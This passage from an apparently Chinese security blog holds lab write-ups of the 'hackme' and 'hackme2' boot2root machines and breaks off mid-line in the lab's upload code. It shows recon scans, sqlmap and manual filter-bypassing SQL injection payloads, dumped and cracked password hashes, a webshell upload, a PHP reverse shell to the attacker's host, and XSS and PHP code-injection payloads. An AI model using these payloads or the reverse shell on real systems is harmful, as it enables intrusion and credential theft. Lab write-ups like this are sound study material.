<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.233</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.233</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-16 21:43 EST</span><br><span class="line">Nmap scan report for 192.168.43.233</span><br><span class="line">Host is up (0.00041s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA)</span><br><span class="line">|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA)</span><br><span class="line">|_  256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.34 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span><br><span class="line">MAC Address: 00:0C:29:BB:BF:3A (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.41 ms 192.168.43.233</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./hackme/1.png" alt></p>
<p>发现一个上传路径，可能后续有帮助</p>
<p><img data-src="./hackme/2.png" alt></p>
<h3 id="web进入"><a href="#web进入" class="headerlink" title="web进入"></a>web进入</h3><p><img data-src="./hackme/3.png" alt></p>
<ul>
<li>注册一个账号 <code>caiji/caiji</code></li>
</ul>
<p><img data-src="./hackme/4.png" alt></p>
<p><img data-src="./hackme/5.png" alt></p>
<ul>
<li><code>sqlmap</code>跑下</li>
</ul>
<p><img data-src="./hackme/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/sqlmap# python sqlmap.py -r 1.txt --level 3 --risk 3</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">sqlmap identified the following injection point(s) with a total of 76 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: search (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: search=a%' AND 3030=3030 AND 'hpBV%'='hpBV</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: search=a%' AND (SELECT 8631 FROM (SELECT(SLEEP(5)))YiEd) AND 'ArCW%'='ArCW</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: search=a%' UNION ALL SELECT CONCAT(0x71717a6b71,0x51616447444d6f486647587a564b63596766716954696370526741747376436f48466b4c57744c4d,0x716a767871),NULL,NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p><img data-src="./hackme/7.png" alt></p>
<p><img data-src="./hackme/8.png" alt></p>
<p>脱裤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 --dbs</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[22:22:39] [INFO] fetching database names</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line">[*] webapphacking</span><br><span class="line"></span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 -D webapphacking --tables</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[22:24:52] [INFO] fetching tables for database: 'webapphacking'</span><br><span class="line">Database: webapphacking</span><br><span class="line">[2 tables]</span><br><span class="line">+-------+</span><br><span class="line">| books |</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r 1.txt --level 3 --risk 3 -D webapphacking -T users --dump-all</span><br><span class="line"></span><br><span class="line">Database: webapphacking</span><br><span class="line">Table: books</span><br><span class="line">[15 entries]</span><br><span class="line">+----+-------+-----------------------------+</span><br><span class="line">| id | price | bookname                    |</span><br><span class="line">+----+-------+-----------------------------+</span><br><span class="line">| 1  | 50    | Anonymous Hackers TTP       |</span><br><span class="line">| 2  | 80    | CISSP Guide                 |</span><br><span class="line">| 3  | 30    | Security+                   |</span><br><span class="line">| 4  | 45    | Practical WebApp Hacking    |</span><br><span class="line">| 5  | 20    | All about Kali Linux        |</span><br><span class="line">| 6  | 10    | Linux OS                    |</span><br><span class="line">| 7  | 10    | Windows OS                  |</span><br><span class="line">| 8  | 190   | IoT Exploitation            |</span><br><span class="line">| 9  | 90    | ZigBee Wireless Hacking     |</span><br><span class="line">| 10 | 50    | JTAG UART Hardware Hacking  |</span><br><span class="line">| 11 | 40    | Container Breakout          |</span><br><span class="line">| 12 | 240   | OSCP/OSCE Guide             |</span><br><span class="line">| 13 | 40    | CREST CRT                   |</span><br><span class="line">| 14 | 88    | Creating your vulnerable VM |</span><br><span class="line">| 15 | 48    | OSINT                       |</span><br><span class="line">+----+-------+-----------------------------+</span><br><span class="line"></span><br><span class="line">[22:25:51] [INFO] table 'webapphacking.books' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.43.233/dump/webapphacking/books.csv'</span><br><span class="line">[22:25:51] [INFO] fetching columns for table 'users' in database 'webapphacking'</span><br><span class="line">[22:25:51] [INFO] fetching entries for table 'users' in database 'webapphacking'</span><br><span class="line">[22:25:51] [INFO] recognized possible password hashes in column 'pasword'</span><br><span class="line">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]</span><br><span class="line">do you want to crack them via a dictionary-based attack? [Y/n/q]</span><br><span class="line">[22:26:06] [INFO] using hash method 'md5_generic_passwd'</span><br><span class="line">what dictionary do you want to use?</span><br><span class="line">[1] default dictionary file '/home/sqlmap/data/txt/wordlist.tx_' (press Enter)</span><br><span class="line">[2] custom dictionary file</span><br><span class="line">[3] file with list of dictionary files</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">[22:26:08] [INFO] using default dictionary</span><br><span class="line">do you want to use common password suffixes? (slow!) [y/N]</span><br><span class="line">[22:26:09] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span><br><span class="line">[22:26:09] [INFO] starting 2 processes</span><br><span class="line">[22:26:15] [INFO] cracked password 'commando' for hash '6269c4f71a55b24bad0f0267d9be5508'</span><br><span class="line">[22:26:18] [INFO] cracked password 'hello' for hash '5d41402abc4b2a76b9719d911017c592'</span><br><span class="line">[22:26:22] [INFO] cracked password 'p@ssw0rd' for hash '0f359740bd1cda994f8b55330c86d845'</span><br><span class="line">[22:26:26] [INFO] cracked password 'testtest' for hash '05a671c66aefea124cc08b76ea6d30bb'</span><br><span class="line">Database: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[7 entries]</span><br><span class="line">+----+--------------+------------+---------------------------------------------+----------------+</span><br><span class="line">| id | name         | user       | pasword                                     | address        |</span><br><span class="line">+----+--------------+------------+---------------------------------------------+----------------+</span><br><span class="line">| 1  | David        | user1      | 5d41402abc4b2a76b9719d911017c592 (hello)    | Newton Circles |</span><br><span class="line">| 2  | Beckham      | user2      | 6269c4f71a55b24bad0f0267d9be5508 (commando) | Kensington     |</span><br><span class="line">| 3  | anonymous    | user3      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) | anonymous      |</span><br><span class="line">| 10 | testismyname | test       | 05a671c66aefea124cc08b76ea6d30bb (testtest) | testaddress    |</span><br><span class="line">| 11 | superadmin   | superadmin | 2386acb2cf356944177746fc92523983            | superadmin     |</span><br><span class="line">| 12 | test1        | test1      | 05a671c66aefea124cc08b76ea6d30bb (testtest) | test1          |</span><br><span class="line">| 13 | ccccc        | caiji1     | c71b01ebcd1a68a635f1e8f41f6a1a62            | ccccc          |</span><br><span class="line">+----+--------------+------------+---------------------------------------------+----------------+</span><br></pre></td></tr></table></figure>

<p><code>sqlmap</code>自带的解密未能解密 超级管理员</p>
<p>somd5 ok</p>
<p><img data-src="./hackme/9.png" alt></p>
<h3 id="登录超管"><a href="#登录超管" class="headerlink" title="登录超管"></a>登录超管</h3><ul>
<li><code>superadmin / Uncrackable</code>,发现文件上传</li>
</ul>
<p><img data-src="./hackme/10.png" alt></p>
<ul>
<li>上传<code>php</code>小马</li>
</ul>
<p><img data-src="./hackme/11.png" alt></p>
<p><img data-src="./hackme/12.png" alt></p>
<h3 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h3><p><img data-src="./hackme/13.png" alt></p>
<p><img data-src="./hackme/14.png" alt></p>
<ul>
<li>反弹<code>shell</code>给 <code>kali</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("192.168.43.86",7777);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./hackme/15.png" alt></p>
<p>反弹失败,<code>ret=2</code></p>
<ul>
<li>使用开源工具 <code>https://github.com/pentestmonkey/php-reverse-shell</code></li>
</ul>
<p><img data-src="./hackme/16.png" alt></p>
<p><img data-src="./hackme/17.png" alt></p>
<p><img data-src="./hackme/18.png" alt></p>
<ul>
<li><code>python</code>交互<code>shell</code> <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li>
</ul>
<p><img data-src="./hackme/19.png" alt></p>
<ul>
<li>提权???</li>
</ul>
<p><img data-src="./hackme/20.png" alt></p>
<ul>
<li>拿到<code>root</code>权限</li>
</ul>
<p><img data-src="./hackme/21.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>hackme</tag>
      </tags>
  </entry>
  <entry>
    <title>hackme2</title>
    <url>/2021/01/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hackme2/</url>
    <content><![CDATA[<h1 id="hackme2"><a href="#hackme2" class="headerlink" title="hackme2"></a>hackme2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hackme2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/sqlmap# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    4e:e2:75:cb:80:5f       (Unknown: locally administered)</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.67   00:0c:29:dd:f8:39       VMware, Inc.</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.982 seconds (129.16 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.67</li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.67</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/sqlmap# nmap -sV -A -p 1-65535 192.168.43.67</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-22 10:14 EST</span><br><span class="line">Nmap scan report for 192.168.43.67</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA)</span><br><span class="line">|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA)</span><br><span class="line">|_  256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.34 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.34 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span><br><span class="line">MAC Address: 00:0C:29:DD:F8:39 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.32 ms 192.168.43.67</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.75 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./hackme2/1.png" alt></p>
<h3 id="web进入"><a href="#web进入" class="headerlink" title="web进入"></a>web进入</h3><p><img data-src="./hackme2/2.png" alt></p>
<ul>
<li>注册账号 <code>caiji123 / caiji123</code></li>
</ul>
<p><img data-src="./hackme2/3.png" alt></p>
<ul>
<li>尝试<code>sql</code>注入</li>
</ul>
<p><code>payload: a%&#39; and &#39;xyz&#39; like &#39;x%</code></p>
<p><img data-src="./hackme2/4.png" alt></p>
<p>有回显</p>
<p><code>payload: a%&#39; and &#39;yz&#39; like &#39;x%</code></p>
<p><img data-src="./hackme2/5.png" alt></p>
<p>无回显</p>
<ul>
<li>尝试<code>sqlmap</code>一把梭(需要绕防火墙)</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /welcome.php HTTP/1.1</span><br><span class="line">Host: 192.168.43.67</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8</span><br><span class="line">Origin: http://192.168.43.67</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.43.67/welcome.php</span><br><span class="line">Cookie: PHPSESSID=23d0972i823vd94g3gsppm0flb</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">search=a</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/sqlmap# python sqlmap.py -r 2.txt --level 5 --risk 3 --tamper=space2comment</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[*] starting @ 10:48:56 /2021-01-22/</span><br><span class="line"></span><br><span class="line">[10:48:56] [INFO] parsing HTTP request from '2.txt'</span><br><span class="line">[10:48:56] [INFO] loading tamper module 'space2comment'</span><br><span class="line">[10:48:57] [INFO] resuming back-end DBMS 'mysql' </span><br><span class="line">[10:48:57] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: search (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: search=a' AND (SELECT 2571 FROM (SELECT(SLEEP(5)))DZtz) AND 'nkJp'='nkJp</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: search=a' UNION ALL SELECT CONCAT(0x716a787671,0x794a41764e4e4d6b6b7341506852554f45734f5645587556544a697a6149504e71715844516b6254,0x71627a6271),NULL,NULL#</span><br><span class="line">---</span><br><span class="line">[10:48:57] [WARNING] changes made by tampering scripts are not included in shown payload content(s)</span><br><span class="line">[10:48:57] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu 18.10 (cosmic)</span><br><span class="line">web application technology: Apache 2.4.34</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[10:48:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.43.67'</span><br><span class="line"></span><br><span class="line">[*] ending @ 10:48:57 /2021-01-22/</span><br></pre></td></tr></table></figure>

<ul>
<li>经测试，发现<code>payload</code>中不能包含空格</li>
</ul>
<p><img data-src="./hackme2/6.png" alt></p>
<p><img data-src="./hackme2/7.png" alt></p>
<h3 id="手注一波"><a href="#手注一波" class="headerlink" title="手注一波"></a>手注一波</h3><ul>
<li>查询数据库</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search=a'/**/UNION/**/SELECT/**/111,database(),333/**/#qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">webapphacking</span><br></pre></td></tr></table></figure>

<ul>
<li>查询库中表</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search=a'/**/UNION/**/select/**/111,222,table_name/**/from/**/information_schema.tables/**/where/**/table_schema='webapphacking'/**/limit/**/0,1/**/#qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">books</span><br><span class="line">users</span><br></pre></td></tr></table></figure>

<ul>
<li>查询<code>user</code>表字段</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search=a'/**/UNION/**/select/**/111,222,column_name/**/from/**/information_schema.columns/**/where/**/table_name='users'/**/and/**/table_schema='webapphacking'/**/limit/**/0,1/**/#qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">id</span><br><span class="line">user</span><br><span class="line">pasword</span><br><span class="line">name</span><br><span class="line">address</span><br></pre></td></tr></table></figure>

<ul>
<li>查询数据</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search=a'/**/UNION/**/select/**/user,name,pasword/**/from/**/webapphacking.users/**/limit/**/0,1/**/#qwe</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">user1 David 5d41402abc4b2a76b9719d911017c592</span><br><span class="line">user2 Beckham 6269c4f71a55b24bad0f0267d9be5508</span><br><span class="line">user3 anonymous 0f359740bd1cda994f8b55330c86d845</span><br><span class="line">test testismyname 05a671c66aefea124cc08b76ea6d30bb</span><br><span class="line">superadmin superadmin 2386acb2cf356944177746fc92523983</span><br><span class="line">test1 test1 05a671c66aefea124cc08b76ea6d30bb</span><br><span class="line">caiji123 caiji123 3247bfe939c613aeec5173af84756d30</span><br></pre></td></tr></table></figure>

<ul>
<li>破解 <code>superadmin</code>密码<code>Uncrackable</code></li>
</ul>
<p><img data-src="./hackme2/8.png" alt></p>
<h3 id="超级管理员登录"><a href="#超级管理员登录" class="headerlink" title="超级管理员登录"></a>超级管理员登录</h3><p><img data-src="./hackme2/9.png" alt></p>
<ul>
<li>尝试图片马上传</li>
</ul>
<p><img data-src="./hackme2/10.png" alt></p>
<p>这里不能上传<code>php</code>,上传的文件也不知道跑哪里去了</p>
<ul>
<li><code>xray</code>走一波(有点不要脸)</li>
</ul>
<p><img data-src="./hackme2/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Vuln: xss]</span><br><span class="line">Target           "http://192.168.43.67/welcomeadmin.php"</span><br><span class="line">VulnType         "reflected/default"</span><br><span class="line">Payload          "&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;"</span><br><span class="line">Position         "body"</span><br><span class="line">ParamKey         "fname"</span><br><span class="line">ParamValue       "cbatqgxxnfuphxltuluw"</span><br><span class="line"></span><br><span class="line">[Vuln: cmd-injection]</span><br><span class="line">Target           "http://192.168.43.67/welcomeadmin.php"</span><br><span class="line">VulnType         "code/php"</span><br><span class="line">Payload          "$&#123;@var_dump(md5(369506327))&#125;;"</span><br><span class="line">Position         "body"</span><br><span class="line">ParamKey         "lname"</span><br><span class="line">ParamValue       "$&#123;@var_dump(md5(369506327))&#125;;"</span><br><span class="line">type             "echo_based"</span><br><span class="line">feature          "0022cd780772b4acb34dd0f9197115c8"</span><br><span class="line"></span><br><span class="line">[Vuln: xss]</span><br><span class="line">Target           "http://192.168.43.67/welcomeadmin.php"</span><br><span class="line">VulnType         "reflected/default"</span><br><span class="line">Payload          "&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;"</span><br><span class="line">Position         "body"</span><br><span class="line">ParamKey         "lname"</span><br><span class="line">ParamValue       "cbatqgxxnfuphxltuluw"</span><br></pre></td></tr></table></figure>

<ul>
<li><code>xss</code>验证</li>
</ul>
<p><img data-src="./hackme2/12.png" alt></p>
<ul>
<li>命令注入利用</li>
</ul>
<p><img data-src="./hackme2/13.png" alt></p>
<p>高亮代码，查看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;@highlight_file(<span class="string">"welcomeadmin.php"</span>)&#125;;</span><br></pre></td></tr></table></figure>

<p><img data-src="./hackme2/14.png" alt></p>
<p><img data-src="./hackme2/15.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Initialize the session</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; Check if the user is logged in, if not then redirect him to login page</span><br><span class="line">if(!isset($_SESSION[&quot;loggedin&quot;]) || $_SESSION[&quot;loggedin&quot;] !&#x3D;&#x3D; true)&#123;</span><br><span class="line">    header(&quot;location: login.php&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Welcome&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;maxcdn.bootstrapcdn.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.css&quot;&gt;</span><br><span class="line">    &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">        body&#123; font: 14px sans-serif; text-align: center; &#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;page-header&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Hi, welcome back &lt;b&gt;&lt;?php echo htmlspecialchars($_SESSION[&quot;name&quot;]); ?&gt;&lt;&#x2F;b&gt;. There are no anomalies detected.&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &lt;a href&#x3D;&quot;reset-password.php&quot; class&#x3D;&quot;btn btn-warning&quot;&gt;Reset Your Password&lt;&#x2F;a&gt;</span><br><span class="line">        &lt;a href&#x3D;&quot;logout.php&quot; class&#x3D;&quot;btn btn-danger&quot;&gt;Sign Out of Your Account&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    Select Image to Upload:</span><br><span class="line">    &lt;form align&#x3D;&quot;center&quot; action&#x3D;&quot;welcomeadmin.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileToUpload&quot; id&#x3D;&quot;fileToUpload&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Upload Image&quot; name&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$target_dir &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;&quot;;</span><br><span class="line">$target_file &#x3D; $target_dir . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);</span><br><span class="line">$uploadOk &#x3D; 1;</span><br><span class="line">$imageFileType &#x3D; strtolower(pathinfo($target_file,PATHINFO_EXTENSION));</span><br><span class="line">&#x2F;&#x2F; Check if image file is a actual image or fake image</span><br><span class="line">if(isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">    $check &#x3D; getimagesize($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">&#x2F;&#x2F;    if($check !&#x3D;&#x3D; false) &#123;</span><br><span class="line">&#x2F;&#x2F;        echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;</span><br><span class="line">&#x2F;&#x2F;        $uploadOk &#x3D; 1;</span><br><span class="line">&#x2F;&#x2F;    &#125; else &#123;</span><br><span class="line">&#x2F;&#x2F;        echo &quot;File is not an image.&quot;;</span><br><span class="line">&#x2F;&#x2F;        $uploadOk &#x3D; 0;</span><br><span class="line">&#x2F;&#x2F;    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; Check if file already exists</span><br><span class="line">if (file_exists($target_file)) &#123;</span><br><span class="line">    echo &quot;Sorry, file already exists.&quot;;</span><br><span class="line">    $uploadOk &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; Check file size</span><br><span class="line">if ($_FILES[&quot;fileToUpload&quot;][&quot;size&quot;] &gt; 500000) &#123;</span><br><span class="line">    echo &quot;Sorry, your file is too large.&quot;;</span><br><span class="line">    $uploadOk &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; whitelist</span><br><span class="line">&#x2F;&#x2F;if($imageFileType !&#x3D; &quot;jpg&quot; &amp;&amp; $imageFileType !&#x3D; &quot;png&quot; &amp;&amp; $imageFileType !&#x3D; &quot;jpeg&quot;</span><br><span class="line">&#x2F;&#x2F;&amp;&amp; $imageFileType !&#x3D; &quot;gif&quot; ) &#123;</span><br><span class="line">&#x2F;&#x2F;    echo &quot;Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.&quot;;</span><br><span class="line">&#x2F;&#x2F;    $uploadOk &#x3D; 0;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line">&#x2F;&#x2F;blacklist</span><br><span class="line">if($imageFileType &#x3D;&#x3D; &quot;html&quot; || $imageFileType &#x3D;&#x3D; &quot;js&quot; || $imageFileType&#x3D;&#x3D;&quot;php&quot; || $imageFileType&#x3D;&#x3D;&quot;php3&quot; || $imageFileType&#x3D;&#x3D;&quot;php4&quot; || 